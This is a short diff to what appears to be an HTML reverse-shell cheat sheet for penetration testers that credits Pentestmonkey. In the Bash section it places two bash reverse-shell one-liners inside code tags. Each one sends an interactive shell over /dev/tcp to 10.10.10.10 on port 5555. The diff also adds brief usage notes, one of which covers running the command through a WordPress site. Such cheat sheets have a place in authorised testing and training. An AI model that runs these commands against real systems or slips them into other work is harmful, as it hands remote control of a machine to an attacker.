@@ -182,9 +182,13 @@ Pentestmonkey <li>http://pentestmonkey.net/</li>
 
 <h2>Bash</h2>
 
-/bin/bash -i >& /dev/tcp/10.10.10.10/5555
+Use this if you have direct access to commands like whoami.
 
-/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1'
+<code>/bin/bash -i >& /dev/tcp/10.10.10.10/5555</code>
+
+You have to do it like this if you run it in on a wordpress site
+
+<code>/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1'</code>
 
 
 <h2>PHP</h2>
